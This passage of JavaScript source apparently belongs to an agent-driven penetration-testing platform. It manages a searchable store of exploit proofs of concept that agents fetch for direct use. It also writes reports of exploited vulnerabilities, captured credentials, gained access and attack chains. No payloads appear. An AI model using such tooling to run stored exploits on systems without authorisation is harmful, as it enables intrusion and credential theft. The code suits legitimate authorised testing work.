    if (content === '' && typeof p.path === 'string' && p.path.length > 0) {
      const src = isAbsolute(p.path) ? p.path : join(this.pocsDirOf(), p.path)
      if (!existsSync(src)) throw new Error('poc content or existing path required: ' + p.path)
      content = readFileSync(src, 'utf8')
    }
    let filePath = null
    if (content !== '') {
      const filename = String(p.filename || '').trim() || defaultPocFilename(title, kind, p.language)
      filePath = join(dir, filename)
      writeFileSync(filePath, content, 'utf8')
    }
    const existing = db.prepare('SELECT * FROM poc WHERE code = ?').get(code)
    const verified = p.verified === undefined || p.verified === null
      ? (existing ? existing.verified : 0)
      : (p.verified ? 1 : 0)
    const now = nowIso()
    db.prepare(`INSERT INTO poc(code, title, kind, cve, component, versions, severity, language, source, source_url,
        description, usage, content, path, verified, verified_note, hit_count, used_on, tags, created_by, created_at, updated_at)
      VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
      ON CONFLICT(code) DO UPDATE SET
        title = excluded.title, kind = excluded.kind, cve = COALESCE(excluded.cve, poc.cve),
        component = COALESCE(excluded.component, poc.component), versions = COALESCE(excluded.versions, poc.versions),
        severity = COALESCE(excluded.severity, poc.severity), language = COALESCE(excluded.language, poc.language),
        source = excluded.source, source_url = COALESCE(excluded.source_url, poc.source_url),
        description = COALESCE(excluded.description, poc.description), usage = COALESCE(excluded.usage, poc.usage),
        content = CASE WHEN excluded.content <> '' THEN excluded.content ELSE poc.content END,
        path = COALESCE(excluded.path, poc.path),
        verified = excluded.verified, verified_note = COALESCE(excluded.verified_note, poc.verified_note),
        tags = COALESCE(excluded.tags, poc.tags), updated_at = excluded.updated_at`).run(
      code, title, kind, p.cve ?? null, p.component ?? null, p.versions ?? null, p.severity ?? null,
      p.language ?? null, source, p.source_url ?? null, p.description ?? null, p.usage ?? null,
      content, filePath, verified, p.verified_note ?? null,
      existing ? existing.hit_count : 0, existing ? existing.used_on : null, p.tags ?? null,
      p.created_by ?? null, existing ? existing.created_at : now, now,
    )
    const row = db.prepare('SELECT * FROM poc WHERE code = ?').get(code)
    this.#reindexPoc(db, row.id)
    return { poc: row, created: existing === undefined, path: filePath }
  }

  /**
   * 检索知识库：Nday/1day 动手前的第一步。
   * @param f - `{ q, cve, component, kind, language, source, verified, tag, limit }`
   */
  searchPocs(f = {}) {
    const db = this.kb()
    const where = []
    const args = []
    const q = String(f.q || f.query || '').trim()
    if (q !== '') {
      /* 全文优先（标题/编号/组件/版本/标签/描述/正文），命中不到再退化成 LIKE 子串匹配 */
      const match = q.split(/\s+/).filter(Boolean).map((t) => '"' + t.replace(/"/g, '') + '"').join(' AND ')
      let ids = []
      try {
        ids = db.prepare('SELECT poc_id FROM poc_fts WHERE poc_fts MATCH ? LIMIT 200').all(match).map((r) => Number(r.poc_id))
      } catch { ids = [] }
      if (ids.length === 0) {
        const like = '%' + q + '%'
        ids = db.prepare(`SELECT id FROM poc WHERE title LIKE ? OR cve LIKE ? OR component LIKE ?
          OR versions LIKE ? OR tags LIKE ? OR description LIKE ? OR content LIKE ? LIMIT 200`)
          .all(like, like, like, like, like, like, like).map((r) => r.id)
      }
      if (ids.length === 0) return []
      where.push(`id IN (${ids.map(() => '?').join(',')})`)
      args.push(...ids)
    }
    if (f.cve) { where.push('cve LIKE ?'); args.push('%' + String(f.cve) + '%') }
    if (f.component) { where.push('component LIKE ?'); args.push('%' + String(f.component) + '%') }
    if (f.kind) { where.push('kind = ?'); args.push(String(f.kind)) }
    if (f.language) { where.push('language = ?'); args.push(String(f.language)) }
    if (f.source) { where.push('source = ?'); args.push(String(f.source)) }
    if (f.tag) { where.push('tags LIKE ?'); args.push('%' + String(f.tag) + '%') }
    if (f.verified === true || f.verified === 1) where.push('verified = 1')
    const clause = where.length ? 'WHERE ' + where.join(' AND ') : ''
    const limit = Math.min(Number(f.limit) || 200, 1000)
    return db.prepare(`SELECT id, code, title, kind, cve, component, versions, severity, language, source, source_url,
        description, usage, path, verified, verified_note, hit_count, used_on, tags, created_by, created_at, updated_at,
        LENGTH(COALESCE(content, '')) AS content_bytes,
        CASE WHEN COALESCE(content, '') = '' THEN 0 ELSE 1 END AS has_content
      FROM poc ${clause} ORDER BY verified DESC, hit_count DESC, updated_at DESC, id DESC LIMIT ?`).all(...args, limit)
  }

  /** 取一条 POC 的完整内容（智能体要直接拿去用，所以连正文一起给）。 */
  getPoc(key) {
    const db = this.kb()
    const raw = String(key === undefined || key === null ? '' : key).trim()
    if (raw === '') return undefined
    const numeric = Number(raw)
    const row = Number.isFinite(numeric) && String(numeric) === raw
      ? db.prepare('SELECT * FROM poc WHERE id = ?').get(numeric)
      : db.prepare('SELECT * FROM poc WHERE code = ?').get(raw)
    if (row === undefined) return undefined
    let content = row.content || ''
    if (content === '' && row.path) {
      try { content = readFileSync(row.path, 'utf8') } catch { content = '' }
    }
    return { ...row, content }
  }

  /** 标一条 POC 被用过（后续按复用次数排序，用得多的排前面）。 */
  markPocUsed(key, usedOn) {
    const db = this.kb()
    const row = this.getPoc(key)
    if (row === undefined) return { ok: false, error: 'poc not found: ' + key }
    db.prepare('UPDATE poc SET hit_count = COALESCE(hit_count, 0) + 1, used_on = ?, updated_at = ? WHERE id = ?')
      .run(usedOn ?? null, nowIso(), row.id)
    return { ok: true, id: row.id, code: row.code, hit_count: (row.hit_count || 0) + 1 }
  }

  /** 补验证结论：只有验证过的 POC 才算"可直接用"，界面上会标出来。 */
  updatePoc(key, patch = {}) {
    const db = this.kb()
    const row = this.getPoc(key)
    if (row === undefined) throw new Error('poc not found: ' + key)
    const next = {
      title: patch.title ?? row.title,
      kind: patch.kind ?? row.kind,
      cve: patch.cve ?? row.cve,
      component: patch.component ?? row.component,
      versions: patch.versions ?? row.versions,
      severity: patch.severity ?? row.severity,
      language: patch.language ?? row.language,
      source: patch.source ?? row.source,
      source_url: patch.source_url ?? row.source_url,
      description: patch.description ?? row.description,
      usage: patch.usage ?? row.usage,
      verified: patch.verified === undefined || patch.verified === null ? row.verified : (patch.verified ? 1 : 0),
      verified_note: patch.verified_note ?? row.verified_note,
      tags: patch.tags ?? row.tags,
      content: typeof patch.content === 'string' && patch.content !== '' ? patch.content : row.content,
      path: row.path,
    }
    if (next.content !== row.content) {
      const filename = 'poc.txt'
      const dir = join(this.pocsDirOf(), row.code)
      mkdirSync(dir, { recursive: true })
      next.path = join(dir, row.path ? basename(row.path) : filename)
      writeFileSync(next.path, next.content || '', 'utf8')
    }
    db.prepare(`UPDATE poc SET title = ?, kind = ?, cve = ?, component = ?, versions = ?, severity = ?, language = ?,
      source = ?, source_url = ?, description = ?, usage = ?, verified = ?, verified_note = ?, tags = ?, content = ?, path = ?, updated_at = ?
      WHERE id = ?`).run(
      next.title, next.kind, next.cve, next.component, next.versions, next.severity, next.language,
      next.source, next.source_url, next.description, next.usage, next.verified, next.verified_note,
      next.tags, next.content, next.path, nowIso(), row.id,
    )
    this.#reindexPoc(db, row.id)
    return this.getPoc(row.id)
  }

  deletePoc(key) {
    const db = this.kb()
    const row = this.getPoc(key)
    if (row === undefined) return { ok: false, error: 'poc not found: ' + key }
    db.prepare('DELETE FROM poc WHERE id = ?').run(row.id)
    db.prepare('DELETE FROM poc_fts WHERE poc_id = ?').run(String(row.id))
    /* 连落盘目录一起删（只在 pocs/ 内按 code 精确删除；删不掉不影响数据一致性） */
    let removedFiles = 0
    try {
      const dir = join(this.pocsDirOf(), row.code)
      if (existsSync(dir) && dir.startsWith(this.pocsDirOf())) {
        removedFiles = readdirSync(dir).length
        rmSync(dir, { recursive: true, force: true })
      }
    } catch { /* 忽略 */ }
    return { ok: true, id: row.id, code: row.code, deleted: true, removed_files: removedFiles }
  }

  /** 知识库概览：界面顶部标签与智能体"先查库"时的一屏摘要。 */
  pocStats() {
    const db = this.kb()
    const one = (sql, ...args) => Object.values(db.prepare(sql).get(...args) || {})[0] ?? 0
    const byKind = db.prepare('SELECT COALESCE(kind, ?) AS kind, COUNT(*) AS n FROM poc GROUP BY kind ORDER BY n DESC').all('poc')
    const bySource = db.prepare('SELECT COALESCE(source, ?) AS source, COUNT(*) AS n FROM poc GROUP BY source ORDER BY n DESC').all('self')
    const topComponents = db.prepare(`SELECT component, COUNT(*) AS n FROM poc WHERE component IS NOT NULL AND component <> ''
      GROUP BY component ORDER BY n DESC, component LIMIT 12`).all()
    return {
      total: one('SELECT COUNT(*) FROM poc'),
      verified: one('SELECT COUNT(*) FROM poc WHERE verified = 1'),
      withContent: one("SELECT COUNT(*) FROM poc WHERE COALESCE(content, '') <> ''"),
      reused: one('SELECT COALESCE(SUM(hit_count), 0) FROM poc'),
      byKind, bySource, topComponents,
      dbPath: this.knowledgePath(),
    }
  }

  /**
   * 按目标分组的成果报告：每个 IP / URL / C 段一份，供界面展开收起。
   * 收录口径与 report() 一致（已验证/已利用且中危以上）。
   */
  reportTargets(id, options = {}) {
    const meta = readMeta(this.metaPathOf(id)) || {}
    const includeAll = options.all === true
    const allVulns = this.listVulns(id, { limit: 2000 }).items
    const severityOrder = { critical: 0, high: 1, medium: 2, low: 3, info: 4 }
    const isResult = (v) => v.status === 'confirmed' || v.status === 'exploited'
    const isReal = (v) => v.severity === 'critical' || v.severity === 'high' || v.severity === 'medium'
    const vulns = (includeAll ? allVulns : allVulns.filter((v) => isResult(v) && isReal(v)))
      .slice().sort((a, b) => (severityOrder[a.severity] ?? 9) - (severityOrder[b.severity] ?? 9))
    const chain = this.listChain(id)
    const creds = this.listCredentials(id, {})
    const access = this.listAccess(id, {})
    const files = this.listAttackFiles(id, {})

    const targets = new Map()
    const ensure = (key) => {
      if (!targets.has(key)) {
        targets.set(key, { key, label: key, kind: /^\d{1,3}(\.\d{1,3}){3}$/.test(key) ? 'ip' : 'host', segment: '', vulns: [], chain: [], access: [], creds: [], files: [] })
      }
      return targets.get(key)
    }
    const assetIpOf = (assetId) => {
      if (assetId === null || assetId === undefined) return undefined
      const asset = this.getAsset(id, assetId)
      return asset === undefined ? undefined : asset.ip
    }
    for (const v of vulns) {
      const key = v.asset_ip || (v.target ? slugTarget(v.target) : '未归属目标')
      const g = ensure(key)
      g.vulns.push(v)
      if (g.segment === '' && v.segment_cidr) g.segment = v.segment_cidr
    }
    for (const a of access) {
      const key = assetIpOf(a.asset_id) || slugTarget(a.host)
      const g = ensure(key)
      g.access.push(a)
      if (g.segment === '') { const asset = a.asset_id === null || a.asset_id === undefined ? undefined : this.getAsset(id, a.asset_id); if (asset && asset.segment_cidr) g.segment = asset.segment_cidr }
    }
    for (const c of creds) ensure(assetIpOf(c.asset_id) || slugTarget(c.host)).creds.push(c)
    for (const f of files) ensure(assetIpOf(f.asset_id) || slugTarget(f.target)).files.push(f)
    for (const st of chain) if (st.asset_ip) ensure(st.asset_ip).chain.push(st)

    const renderVuln = (v) => {
      const out = []
      out.push(`#### [${(v.severity || 'info').toUpperCase()}] ${v.cve ? v.cve + ' — ' : ''}${v.title || ''}`, '')
      out.push(`- 目标：${v.target || '—'}`)
      out.push(`- 状态：${v.status === 'exploited' ? '已成功利用' : '已验证'} · 置信度：${v.confidence === null || v.confidence === undefined ? '—' : v.confidence} · 发现方式：${v.source || '—'}`)
      out.push(`- 危害与证据：${v.evidence || '—'}`)
      const evidence = this.listHttpEvidence(id, { vuln_id: v.id })
      if (evidence.length) {
        out.push('', '**复现请求（可直接粘贴进 Burp Suite / Yakit）**：', '')
        for (const e of evidence) {
          out.push(`*${e.label || e.method + ' ' + (e.url || '')}*`, '')
          if (e.request) out.push('```http', e.request.replace(/\r/g, '').trim(), '```', '')
          if (e.response) out.push('响应摘要：', '```http', String(e.response).replace(/\r/g, '').trim().slice(0, 2000), '```', '')
        }
      }
      out.push('')
      return out
    }

    const groups = new Map()
    const list = []
    for (const g of targets.values()) {
      const lines = []
      lines.push(`## ${g.label}${g.segment ? '（' + g.segment + '）' : ''}`, '')
      const bySeverity = { critical: 0, high: 0, medium: 0 }
      for (const v of g.vulns) bySeverity[v.severity] = (bySeverity[v.severity] || 0) + 1
      lines.push(`- 成果：漏洞 ${g.vulns.length} 个（严重 ${bySeverity.critical} · 高危 ${bySeverity.high} · 中危 ${bySeverity.medium}）· 已控 ${g.access.length} · 凭据 ${g.creds.length} · 攻击文件 ${g.files.length}`, '')
      if (g.vulns.length) { lines.push('### 成果漏洞', ''); for (const v of g.vulns) lines.push(...renderVuln(v)) }
      if (g.access.length) {
        lines.push('### 已获得权限', '')
        for (const a of g.access) lines.push(`- ${a.host} · ${a.username || '—'} · ${a.method || '—'} · ${a.privilege || '—'} · ${a.session_ref || ''}`)
        lines.push('')
      }
      if (g.creds.length) {
        lines.push('### 凭据', '')
        for (const c of g.creds) lines.push(`- ${c.host} · ${c.username || '—'} · ${c.secret_type || '—'} · ${c.privilege || '—'} · ${c.secret_ref || ''}`)
        lines.push('')
      }
      if (g.files.length) {
        lines.push('### 攻击文件', '')
        for (const f of g.files) lines.push(`- \`${f.name}\`（${f.kind}）：${f.description || '—'}｜效果：${f.evidence}｜路径：${f.path}`)
        lines.push('')
      }
      if (g.chain.length) {
        lines.push('### 攻击链', '')
        for (const st of g.chain) lines.push(`${st.seq}. [${st.stage}] ${st.title}${st.detail ? ' — ' + st.detail : ''}`)
        lines.push('')
      }
      const entry = {
        key: g.key, label: g.label, kind: g.kind, segment: g.segment || '未归属',
        stats: { vulns: g.vulns.length, bySeverity, accesses: g.access.length, credentials: g.creds.length, files: g.files.length, chainSteps: g.chain.length },
        markdown: lines.join('\n'),
      }
      list.push(entry)
      const cidr = entry.segment
      if (!groups.has(cidr)) groups.set(cidr, { cidr, targets: [] })
      groups.get(cidr).targets.push(entry)
    }
    const grouped = Array.from(groups.values())
      .map((g) => ({ cidr: g.cidr, targets: g.targets.slice().sort((a, b) => b.stats.vulns - a.stats.vulns || a.label.localeCompare(b.label)) }))
      .sort((a, b) => a.cidr.localeCompare(b.cidr))
    return {
      generated_at: nowIso(),
      engagement: { id, name: meta.target_name || id, scope: meta.scope_cidrs || [] },
      groups: grouped,
      targets: list,
      totals: {
        targets: list.length,
        vulns: vulns.length,
        accesses: access.length,
        credentials: creds.length,
        files: files.length,
        filteredOut: allVulns.length - vulns.length,
      },
    }
  }

  /* ---------- 报告 ---------- */

  /**
   * 生成 Markdown 成果报告。
   *
   * 只交付「成果漏洞」：状态为 confirmed / exploited，且严重级为 critical / high / medium。
   * 待验证（candidate）、误报（false-positive）、低危与信息级（low/info）都不进报告——
   * 它们是过程噪声（水洞）。信息收集的资产清单也不进报告（在资产测绘页面看）。
   * 报告保留：成果漏洞（含可粘贴进 Burp/Yakit 的原始请求）、攻击链（内网突破成果）、
   * 已获得权限与凭据、修复建议。
   *
   * @param id - 靶标 id。
   * @param options - `{ all: true }` 时输出全部漏洞（用于自查，不出交付物）。
   */
  report(id, options = {}) {
    const meta = readMeta(this.metaPathOf(id)) || {}
    const includeAll = options.all === true
    const chain = this.listChain(id)
    const creds = this.listCredentials(id, {})
    const access = this.listAccess(id, {})
    const allVulns = this.listVulns(id, { limit: 2000 }).items
    const severityOrder = { critical: 0, high: 1, medium: 2, low: 3, info: 4 }
    const isResult = (v) => v.status === 'confirmed' || v.status === 'exploited'
    const isReal = (v) => v.severity === 'critical' || v.severity === 'high' || v.severity === 'medium'
    const vulns = (includeAll ? allVulns : allVulns.filter((v) => isResult(v) && isReal(v)))
      .slice()
      .sort((a, b) => (severityOrder[a.severity] ?? 9) - (severityOrder[b.severity] ?? 9))
    const filteredOut = allVulns.length - vulns.length

    const lines = []
    const push = (...xs) => lines.push(...xs)
    const bySeverity = { critical: 0, high: 0, medium: 0, low: 0, info: 0 }
    for (const v of vulns) bySeverity[v.severity] = (bySeverity[v.severity] || 0) + 1
    const exploited = vulns.filter((v) => v.status === 'exploited').length

    push(`# 攻防演练成果报告 — ${meta.target_name || id}`, '')
    push(`- 生成时间：${nowIso()}`)
    push(`- 授权范围：${(meta.scope_cidrs || []).join(', ') || '（未记录）'}`)
    push(`- 成果概览：成果漏洞 ${vulns.length} 个（严重 ${bySeverity.critical} · 高危 ${bySeverity.high} · 中危 ${bySeverity.medium}）· 已成功利用 ${exploited} 个 · 已控制资产 ${access.length} 台 · 已获取凭据 ${creds.length} 条`)
    push('')

    push('## 一、成果漏洞', '')
    if (!vulns.length) {
      push('本次演练暂无可交付的成果漏洞（只收录已验证/已利用且中危及以上的漏洞）。', '')
    } else {
      for (const v of vulns) {
        push(`### [${(v.severity || 'info').toUpperCase()}] ${v.cve ? v.cve + ' — ' : ''}${v.title || ''}`, '')
        push(`- 目标：${v.target || '—'}`)
        push(`- 资产：${v.asset_ip || '—'}（${v.segment_cidr || '—'}）`)
        push(`- 状态：${v.status === 'exploited' ? '已成功利用' : '已验证'} · 置信度：${v.confidence === null || v.confidence === undefined ? '—' : v.confidence} · 发现方式：${v.source || '—'}`)
        push(`- 危害与证据：${v.evidence || '—'}`)
        const evidence = this.listHttpEvidence(id, { vuln_id: v.id })
        if (evidence.length) {
          push('', '**复现请求（可直接粘贴进 Burp Suite / Yakit）**：', '')
          for (const e of evidence) {
            push(`*${e.label || e.method + ' ' + (e.url || '')}*`, '')
            if (e.request) push('```http', e.request.replace(/\r/g, '').trim(), '```', '')
            if (e.response) push('响应摘要：', '```http', String(e.response).replace(/\r/g, '').trim().slice(0, 2000), '```', '')
          }
        }
        push('')
      }
    }

    push('## 二、攻击链', '')
    if (chain.length) {
      for (const s of chain) {
        push(`${s.seq}. **[${s.stage}] ${s.title}**`)
        if (s.asset_ip) push(`   - 资产：${s.asset_ip}`)
        if (s.vuln_title || s.vuln_cve) push(`   - 漏洞：${s.vuln_cve ? s.vuln_cve + ' ' : ''}${s.vuln_title || ''}`)
        if (s.detail) push(`   - 说明：${s.detail}`)
        if (s.evidence_ref) push(`   - 证据：${s.evidence_ref}`)
      }
    } else push('（未记录攻击链步骤）')
    push('')

    push('## 三、已获得权限与凭据', '')
    if (access.length) {
      push('| 主机 | 账号 | 方式 | 权限 | 证据 |', '| --- | --- | --- | --- | --- |')
      for (const a of access) push(`| ${a.host} | ${a.username || '—'} | ${a.method || '—'} | ${a.privilege || '—'} | ${a.session_ref || '—'} |`)
    } else push('（未获得可用访问）')
    push('')
    if (creds.length) {
      push('| 主机 | 账号 | 类型 | 权限 | 引用 |', '| --- | --- | --- | --- | --- |')
      for (const c of creds) push(`| ${c.host} | ${c.username || '—'} | ${c.secret_type || '—'} | ${c.privilege || '—'} | ${c.secret_ref || '—'} |`)
    } else push('（未获取凭据）')
    push('')

    push('## 四、修复建议', '')
    const advice = []
    if (vulns.some((v) => v.cve)) advice.push('1. 按上方 CVE 编号优先修补受影响组件，建立组件版本基线并纳入补丁管理。')
    if (access.some((a) => a.method === 'webshell' || a.method === 'rce' || a.method === 'upload')) advice.push('2. 收紧文件上传与命令执行面：上传目录禁止执行、白名单校验、最小权限运行 Web 进程。')
    if (access.some((a) => a.method === 'vnc' || a.method === 'rdp' || a.method === 'ssh')) advice.push('3. 收敛远程管理暴露面（VNC/RDP/SSH 不暴露公网），强制强口令与多因子认证。')
    if (creds.some((c) => c.secret_type === 'connection-string')) advice.push('4. 禁止通过接口/配置泄露数据库连接串，密钥统一纳入密钥管理并对接口做鉴权。')
    advice.push(`${advice.length + 1}. 对本次涉及的接口做统一鉴权与越权校验，建立接口资产台账与自动化回归测试。`)
    push(...advice, '')

    if (filteredOut > 0 && !includeAll) {
      push(`> 本报告只收录已验证/已利用且中危以上的成果漏洞；另有 ${filteredOut} 条待验证、误报或低危/信息级记录未纳入（可在「漏洞战果」页面查看）。`)
      push('')
    }

    return {
      markdown: lines.join('\n'),
      generated_at: nowIso(),
      stats: {
        results: vulns.length,
        bySeverity,
        exploited,
        filteredOut,
        accesses: access.length,
        credentials: creds.length,
        chainSteps: chain.length,
      },
    }
  }

  /* ---------- 写入原语 ---------- */
  #upsertSegment(db, seg) {
    db.prepare(`INSERT INTO segment(cidr, ip_start, ip_end, org, asn, country, city, source, first_seen, last_seen)
      VALUES(?,?,?,?,?,?,?,?,?,?)
      ON CONFLICT(cidr) DO UPDATE SET
        org = COALESCE(excluded.org, segment.org),
        asn = COALESCE(excluded.asn, segment.asn),
        country = COALESCE(excluded.country, segment.country),
        city = COALESCE(excluded.city, segment.city),
        last_seen = excluded.last_seen`).run(
      seg.cidr, seg.ip_start ?? null, seg.ip_end ?? null, seg.org ?? null, seg.asn ?? null,
      seg.country ?? null, seg.city ?? null, seg.source ?? null, seg.first_seen ?? nowIso(), nowIso(),
    )
  }

  #upsertAsset(db, a) {
    const cidr = a.segment_cidr || cidrOf(a.ip)
    this.#upsertSegment(db, { cidr, source: a.provenance, first_seen: a.first_seen })
    const t = nowIso()
    db.prepare(`INSERT INTO asset(segment_cidr, ip, ip_int, state, primary_name, confidence, first_seen, last_seen, scope)
      VALUES(?,?,?,?,?,?,?,?,?)
      ON CONFLICT(segment_cidr, ip) DO UPDATE SET
        state = COALESCE(excluded.state, asset.state),
        primary_name = COALESCE(excluded.primary_name, asset.primary_name),
        scope = COALESCE(NULLIF(asset.scope, ''), excluded.scope),
        last_seen = excluded.last_seen`).run(
      cidr, a.ip, ipToInt(a.ip), a.state ?? 'unknown', a.primary_name ?? null, a.confidence ?? null,
      a.first_seen ?? t, t, a.scope || scopeOfIp(a.ip),
    )
    return db.prepare('SELECT id FROM asset WHERE segment_cidr = ? AND ip = ?').get(cidr, a.ip).id
  }

  #observe(db, entityKind, entityId, attr, value, provenance, tool, rawRef) {
    db.prepare(`INSERT INTO observation(entity_kind, entity_id, attr, value, provenance, tool, collected_at, raw_ref)
      VALUES(?,?,?,?,?,?,?,?)`).run(
      entityKind, entityId, attr ?? null, value == null ? null : String(value),
      provenance ?? 'unknown', tool ?? null, nowIso(), rawRef ?? null,
    )
  }

  #edge(db, srcKind, srcId, dstKind, dstId, relation, confidence) {
    db.prepare(`INSERT INTO edge(src_kind, src_id, dst_kind, dst_id, relation, confidence, first_seen, last_seen)
      VALUES(?,?,?,?,?,?,?,?)
      ON CONFLICT(src_kind, src_id, dst_kind, dst_id, relation) DO UPDATE SET last_seen = excluded.last_seen`).run(
      srcKind, String(srcId), dstKind, String(dstId), relation, confidence ?? null, nowIso(), nowIso(),
    )
  }

  /** 重建单个资产的全文索引行（列表、图谱、后续智能体共用一份索引）。 */
  #reindex(db, assetId) {
    const a = db.prepare('SELECT * FROM asset WHERE id = ?').get(assetId)
    if (!a) return
    const names = db.prepare('SELECT name FROM asset_name WHERE asset_id = ?').all(assetId).map((r) => r.name).join(' ')
    const banners = db.prepare('SELECT banner FROM port WHERE asset_id = ? AND banner IS NOT NULL').all(assetId).map((r) => r.banner).join(' ')
    const titles = db.prepare('SELECT title FROM port WHERE asset_id = ? AND title IS NOT NULL').all(assetId).map((r) => r.title).join(' ')
      + ' ' + db.prepare('SELECT url FROM port WHERE asset_id = ? AND url IS NOT NULL').all(assetId).map((r) => r.url).join(' ')
      + ' ' + db.prepare(`SELECT s.product, s.name, s.version FROM service s JOIN port p ON p.id = s.port_id WHERE p.asset_id = ?`)
        .all(assetId).map((r) => [r.name, r.product, r.version].filter(Boolean).join(' ')).join(' ')
    const fps = db.prepare('SELECT vendor, product, version, category FROM fingerprint WHERE asset_id = ?')
      .all(assetId).map((r) => [r.category, r.vendor, r.product, r.version].filter(Boolean).join(' ')).join(' ')
    db.prepare('DELETE FROM asset_fts WHERE asset_id = ?').run(String(assetId))
    db.prepare('INSERT INTO asset_fts(asset_id, ip, names, banners, titles, fingerprints) VALUES(?,?,?,?,?,?)')
      .run(String(assetId), a.ip, names, banners, titles, fps)
  }

  /**
   * 采集结果入库（信息收集智能体与外部工具的统一 ingest 格式）。
   * bundle = { scan:{tool,argv,agent_session_id}, segments:[], assets:[], edges:[] }
   * asset  = { ip, state, primary_name, provenance, tool, names:[{name,kind}],
   *            ports:[{port,proto,service,product,version,banner,provenance,tool,
   *                    fingerprints:[{category,vendor,product,version,evidence}]}] }
   */
  importBundle(id, bundle = {}) {
    const db = this.db(id)
    const counts = { segments: 0, assets: 0, ports: 0, services: 0, fingerprints: 0, names: 0, edges: 0 }
    let runId = null
    if (bundle.scan) {
      const r = db.prepare(`INSERT INTO scan_run(agent_session_id, tool, argv, started_at, status)
        VALUES(?,?,?,?,'completed')`).run(
        bundle.scan.agent_session_id ?? null, bundle.scan.tool ?? null,
        bundle.scan.argv ? JSON.stringify(bundle.scan.argv) : null, nowIso(),
      )
      runId = Number(r.lastInsertRowid)
    }
    db.exec('BEGIN')
    try {
      for (const seg of bundle.segments || []) { this.#upsertSegment(db, seg); counts.segments++ }
      for (const a of bundle.assets || []) {
        const provenance = a.provenance || 'active'
        const tool = a.tool || (bundle.scan && bundle.scan.tool) || null
        const assetId = this.#upsertAsset(db, Object.assign({}, a, { provenance }))
        counts.assets++
        for (const n of a.names || []) {
          db.prepare(`INSERT INTO asset_name(asset_id, name, kind, provenance, tool, first_seen, last_seen)
            VALUES(?,?,?,?,?,?,?) ON CONFLICT(asset_id, name, kind) DO UPDATE SET last_seen = excluded.last_seen`)
            .run(assetId, n.name, n.kind ?? 'domain', n.provenance ?? provenance, tool, nowIso(), nowIso())
          counts.names++
          this.#observe(db, 'asset', assetId, 'name', n.name, n.provenance ?? provenance, tool, runId)
          this.#edge(db, 'domain', n.name, 'asset', assetId, 'resolves')
        }
        if (a.primary_name) this.#observe(db, 'asset', assetId, 'primary_name', a.primary_name, provenance, tool, runId)
        for (const p of a.ports || []) {
          const pProv = p.provenance || provenance
          db.prepare(`INSERT INTO port(asset_id, proto, port, state, provenance, tool, banner, url, title, first_seen, last_seen)
            VALUES(?,?,?,?,?,?,?,?,?,?,?)
            ON CONFLICT(asset_id, proto, port) DO UPDATE SET
              state = excluded.state,
              banner = COALESCE(excluded.banner, port.banner),
              url = COALESCE(excluded.url, port.url),
              title = COALESCE(excluded.title, port.title),
              last_seen = excluded.last_seen`)
            .run(assetId, p.proto ?? 'tcp', Number(p.port), p.state ?? 'open', pProv, p.tool ?? tool,
              p.banner ?? null, p.url ?? null, p.title ?? null, nowIso(), nowIso())
          const portId = db.prepare('SELECT id FROM port WHERE asset_id = ? AND proto = ? AND port = ?')
            .get(assetId, p.proto ?? 'tcp', Number(p.port)).id
          counts.ports++
          this.#observe(db, 'port', portId, 'open', `${p.port}/${p.proto ?? 'tcp'}`, pProv, p.tool ?? tool, runId)
          if (p.service || p.product || p.version) {
            db.prepare(`INSERT INTO service(port_id, name, product, version, cpe, provenance, tool, first_seen, last_seen)
              VALUES(?,?,?,?,?,?,?,?,?)`).run(
              portId, p.service ?? null, p.product ?? null, p.version ?? null, p.cpe ?? null,
              pProv, p.tool ?? tool, nowIso(), nowIso(),
            )
            counts.services++
            this.#observe(db, 'port', portId, 'service', [p.service, p.product, p.version].filter(Boolean).join(' '), pProv, p.tool ?? tool, runId)
          }
          for (const fp of p.fingerprints || []) {
            db.prepare(`INSERT INTO fingerprint(asset_id, port_id, category, vendor, product, version, evidence, confidence, provenance, tool, first_seen, last_seen)
              VALUES(?,?,?,?,?,?,?,?,?,?,?,?)`).run(
              assetId, portId, fp.category ?? null, fp.vendor ?? null, fp.product ?? null, fp.version ?? null,
              fp.evidence ?? null, fp.confidence ?? null, fp.provenance ?? pProv, fp.tool ?? tool, nowIso(), nowIso(),
            )
            counts.fingerprints++
            this.#observe(db, 'asset', assetId, 'fingerprint',
              [fp.category, fp.vendor, fp.product, fp.version].filter(Boolean).join(' '),
              fp.provenance ?? pProv, fp.tool ?? tool, runId)
          }
        }
        this.#reindex(db, assetId)
      }
      for (const e of bundle.edges || []) {
        this.#edge(db, e.src_kind, e.src_id, e.dst_kind, e.dst_id, e.relation, e.confidence)
        counts.edges++
      }
      db.exec('COMMIT')
    } catch (error) {
      db.exec('ROLLBACK')
      throw error
    }
    return { scan_run_id: runId, counts, stats: this.stats(id) }
  }

  /* ---------- 提示词 ---------- */

  /** 默认提示词指纹清单（记录本靶标上次被写入默认时的内容指纹）。 */
  promptManifestPathOf(id) { return join(this.promptsDirOf(id), '.defaults.json') }

  readPromptManifest(id) {
    try {
      const raw = readFileSync(this.promptManifestPathOf(id), 'utf8')
      const data = JSON.parse(raw)
      return data !== null && typeof data === 'object' ? data : {}
    } catch { return {} }
  }

  writePromptManifest(id, manifest) {
    try {
      mkdirSync(this.promptsDirOf(id), { recursive: true })
      writeFileSync(this.promptManifestPathOf(id), JSON.stringify(manifest, null, 2), 'utf8')
    } catch { /* 写不进去不影响使用 */ }
  }

  /**
   * 把"仍是旧版内置默认"的角色提示词换成当前版本；用户自己改过的原样保留。
   *
   * 判断依据：内容指纹等于 ① 本靶标上次写入默认时的指纹（manifest），或
   * ② 任一历史版本的默认指纹（LEGACY_PROMPT_HASHES）。两者都不匹配 = 用户自己写的。
   * 每次读提示词（面板打开）时顺带跑一遍，所以老靶标也会自动跟上新版。
   */
  refreshDefaultPrompts(id) {
    const manifest = this.readPromptManifest(id)
    let changed = 0
    const kept = []
    for (const role of Object.keys(ROLE_TITLES)) {
      const next = DEFAULT_PROMPTS[role] || ''
      const p = join(this.promptsDirOf(id), `${role}.md`)
      if (!existsSync(p)) continue
      const cur = readFileSync(p, 'utf8')
      const h = promptHash(cur)
      const hNext = promptHash(next)
      if (h === hNext) { manifest[role] = hNext; continue }
      const wasDefault = manifest[role] === h || (LEGACY_PROMPT_HASHES[role] || []).includes(h)
      if (!wasDefault) { kept.push(role); continue }
      /* 覆盖前留一份 .bak，万一判错还能找回 */
      try { copyFileSync(p, `${p}.bak-${Date.now()}`) } catch { /* 忽略 */ }
      writeFileSync(p, next, 'utf8')
      manifest[role] = hNext
      changed += 1
    }
    this.writePromptManifest(id, manifest)
    return { changed, kept }
  }

  listPrompts(id) {
    const dir = this.promptsDirOf(id)
